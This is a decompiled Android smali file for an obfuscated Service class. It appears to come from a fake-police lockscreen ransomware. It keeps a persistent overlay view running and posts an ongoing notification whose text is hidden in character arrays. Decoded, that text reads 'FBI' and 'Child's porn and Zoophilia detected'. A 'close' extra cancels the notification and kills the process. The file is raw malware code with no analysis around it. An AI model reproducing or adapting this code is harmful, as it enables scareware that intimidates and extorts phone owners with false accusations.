.class public Lkosp/ynqekv/swdt/Fxjmcxqw;
.super Landroid/app/Service;
.source "Fxjmcxqw.java"


# instance fields
.field protected cancelNotification:Z

.field protected foreground:Z

.field protected id:I

.field private instance:Lkosp/ynqekv/swdt/Fxjmcxqw;

.field private overlayView:Lkosp/ynqekv/swdt/Srkwwc;


# direct methods
.method public constructor <init>()V
    .locals 1

    .prologue
    const/4 v0, 0x0

    .line 31
    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    .line 33
    iput-boolean v0, p0, Lkosp/ynqekv/swdt/Fxjmcxqw;->foreground:Z

    .line 34
    iput-boolean v0, p0, Lkosp/ynqekv/swdt/Fxjmcxqw;->cancelNotification:Z

    .line 35
    iput v0, p0, Lkosp/ynqekv/swdt/Fxjmcxqw;->id:I

    .line 31
    return-void
.end method


# virtual methods
.method protected foregroundNotification(I)Landroid/app/Notification;
    .locals 6
    .param p1, "notificationId"    # I

    .prologue
    const/4 v5, 0x3

    .line 45
    new-instance v0, Landroid/app/Notification;

    const/high16 v1, 0x7f020000

    new-instance v2, Ljava/lang/String;

    new-array v3, v5, [C

    fill-array-data v3, :array_0

    invoke-direct {v2, v3}, Ljava/lang/String;-><init>([C)V

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v3

    invoke-direct {v0, v1, v2, v3, v4}, Landroid/app/Notification;-><init>(ILjava/lang/CharSequence;J)V

    .line 47
    .local v0, "notification":Landroid/app/Notification;
    iget v1, v0, Landroid/app/Notification;->flags:I

    or-int/lit8 v1, v1, 0x2

    or-int/lit8 v1, v1, 0x8

    iput v1, v0, Landroid/app/Notification;->flags:I

    .line 49
    new-instance v1, Ljava/lang/String;

    new-array v2, v5, [C

    fill-array-data v2, :array_1

    invoke-direct {v1, v2}, Ljava/lang/String;-><init>([C)V

    new-instance v2, Ljava/lang/String;

    const/16 v3, 0x23

    new-array v3, v3, [C

    fill-array-data v3, :array_2

    invoke-direct {v2, v3}, Ljava/lang/String;-><init>([C)V

    const/4 v3, 0x0

    invoke-virtual {v0, p0, v1, v2, v3}, Landroid/app/Notification;->setLatestEventInfo(Landroid/content/Context;Ljava/lang/CharSequence;Ljava/lang/CharSequence;Landroid/app/PendingIntent;)V

    .line 51
    return-object v0

    .line 45
    nop

    :array_0
    .array-data 2
        0x46s
        0x42s
        0x49s
    .end array-data

    .line 49
    nop

    :array_1
    .array-data 2
        0x46s
        0x42s
        0x49s
    .end array-data

    nop

    :array_2
    .array-data 2
        0x43s
        0x68s
        0x69s
        0x6cs
        0x64s
        0x2019s
        0x73s
        0x20s
        0x70s
        0x6fs
        0x72s
        0x6es
        0x20s
        0x61s
        0x6es
        0x64s
        0x20s
        0x5as
        0x6fs
        0x6fs
        0x70s
        0x68s
        0x69s
        0x6cs
        0x69s
        0x61s
        0x20s
        0x64s
        0x65s
        0x74s
        0x65s
        0x63s
        0x74s
        0x65s
        0x64s
    .end array-data
.end method

.method public moveToBackground(I)V
    .locals 1
    .param p1, "id"    # I

    .prologue
    .line 79
    iget-boolean v0, p0, Lkosp/ynqekv/swdt/Fxjmcxqw;->cancelNotification:Z

    invoke-virtual {p0, p1, v0}, Lkosp/ynqekv/swdt/Fxjmcxqw;->moveToBackground(IZ)V

    .line 80
    return-void
.end method

.method public moveToBackground(IZ)V
    .locals 1
    .param p1, "id"    # I
    .param p2, "cancelNotification"    # Z

    .prologue
    .line 73
    const/4 v0, 0x0

    iput-boolean v0, p0, Lkosp/ynqekv/swdt/Fxjmcxqw;->foreground:Z

    .line 74
    const/4 p1, 0x0

    .line 75
    invoke-super {p0, p2}, Landroid/app/Service;->stopForeground(Z)V

    .line 76
    return-void
.end method

.method public moveToForeground(ILandroid/app/Notification;Z)V
    .locals 1
    .param p1, "id"    # I
    .param p2, "notification"    # Landroid/app/Notification;
    .param p3, "cancelNotification"    # Z

    .prologue
    .line 59
    iget-boolean v0, p0, Lkosp/ynqekv/swdt/Fxjmcxqw;->foreground:Z

    if-nez v0, :cond_1

    if-eqz p2, :cond_1

    .line 60
    const/4 v0, 0x1

    iput-boolean v0, p0, Lkosp/ynqekv/swdt/Fxjmcxqw;->foreground:Z

    .line 61
    iput p1, p0, Lkosp/ynqekv/swdt/Fxjmcxqw;->id:I

    .line 62
    iput-boolean p3, p0, Lkosp/ynqekv/swdt/Fxjmcxqw;->cancelNotification:Z

    .line 64
    invoke-super {p0, p1, p2}, Landroid/app/Service;->startForeground(ILandroid/app/Notification;)V

    .line 69
    :cond_0
    :goto_0
    return-void

    .line 65
    :cond_1
    iget v0, p0, Lkosp/ynqekv/swdt/Fxjmcxqw;->id:I

    if-eq v0, p1, :cond_0

    if-lez p1, :cond_0

    if-eqz p2, :cond_0

    .line 66
    iput p1, p0, Lkosp/ynqekv/swdt/Fxjmcxqw;->id:I

    .line 67
    const-string v0, "notification"

    invoke-virtual {p0, v0}, Lkosp/ynqekv/swdt/Fxjmcxqw;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/NotificationManager;

    invoke-virtual {v0, p1, p2}, Landroid/app/NotificationManager;->notify(ILandroid/app/Notification;)V

    goto :goto_0
.end method

.method public moveToForeground(IZ)V
    .locals 1
    .param p1, "id"    # I
    .param p2, "cancelNotification"    # Z

    .prologue
    .line 55
    invoke-virtual {p0, p1}, Lkosp/ynqekv/swdt/Fxjmcxqw;->foregroundNotification(I)Landroid/app/Notification;

    move-result-object v0

    invoke-virtual {p0, p1, v0, p2}, Lkosp/ynqekv/swdt/Fxjmcxqw;->moveToForeground(ILandroid/app/Notification;Z)V

    .line 56
    return-void
.end method

.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 1
    .param p1, "intent"    # Landroid/content/Intent;

    .prologue
    .line 118
    const/4 v0, 0x0

    return-object v0
.end method

.method public onCreate()V
    .locals 1

    .prologue
    .line 109
    invoke-super {p0}, Landroid/app/Service;->onCreate()V

    .line 111
    iput-object p0, p0, Lkosp/ynqekv/swdt/Fxjmcxqw;->instance:Lkosp/ynqekv/swdt/Fxjmcxqw;

    .line 113
    new-instance v0, Lkosp/ynqekv/swdt/Srkwwc;

    invoke-direct {v0, p0}, Lkosp/ynqekv/swdt/Srkwwc;-><init>(Lkosp/ynqekv/swdt/Fxjmcxqw;)V

    iput-object v0, p0, Lkosp/ynqekv/swdt/Fxjmcxqw;->overlayView:Lkosp/ynqekv/swdt/Srkwwc;

    .line 114
    return-void
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .locals 5
    .param p1, "intent"    # Landroid/content/Intent;
    .param p2, "flags"    # I
    .param p3, "startId"    # I

    .prologue
    const/4 v4, 0x1

    .line 84
    const/4 v0, 0x0

    .line 85
    .local v0, "extras":Landroid/os/Bundle;
    if-eqz p1, :cond_0

    .line 86
    invoke-virtual {p1}, Landroid/content/Intent;->getExtras()Landroid/os/Bundle;

    move-result-object v0

    .line 88
    :cond_0
    if-eqz v0, :cond_1

    .line 92
    new-instance v2, Ljava/lang/String;

    const/4 v3, 0x5

    new-array v3, v3, [C

    fill-array-data v3, :array_0

    invoke-direct {v2, v3}, Ljava/lang/String;-><init>([C)V

    invoke-virtual {v0, v2}, Landroid/os/Bundle;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    .line 93
    .local v1, "value1":Ljava/lang/String;
    if-eqz v1, :cond_1

    .line 95
    iput-boolean v4, p0, Lkosp/ynqekv/swdt/Fxjmcxqw;->cancelNotification:Z

    .line 96
    iget v2, p0, Lkosp/ynqekv/swdt/Fxjmcxqw;->id:I

    invoke-virtual {p0, v2, v4}, Lkosp/ynqekv/swdt/Fxjmcxqw;->moveToBackground(IZ)V

    .line 97
    const-string v2, "notification"

    invoke-virtual {p0, v2}, Lkosp/ynqekv/swdt/Fxjmcxqw;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Landroid/app/NotificationManager;

    iget v3, p0, Lkosp/ynqekv/swdt/Fxjmcxqw;->id:I

    invoke-virtual {v2, v3}, Landroid/app/NotificationManager;->cancel(I)V

    .line 98
    invoke-static {}, Landroid/os/Process;->myPid()I

    move-result v2

    invoke-static {v2}, Landroid/os/Process;->killProcess(I)V

    .line 102
    .end local v1    # "value1":Ljava/lang/String;
    :cond_1
    iget-object v2, p0, Lkosp/ynqekv/swdt/Fxjmcxqw;->overlayView:Lkosp/ynqekv/swdt/Srkwwc;

    if-eqz v2, :cond_2

    .line 103
    iget-object v2, p0, Lkosp/ynqekv/swdt/Fxjmcxqw;->overlayView:Lkosp/ynqekv/swdt/Srkwwc;

    invoke-virtual {v2}, Lkosp/ynqekv/swdt/Srkwwc;->refreshLayout()V

    .line 105
    :cond_2
    return v4

    .line 92
    :array_0
    .array-data 2
        0x63s
        0x6cs
        0x6fs
        0x73s
        0x65s
    .end array-data
.end method
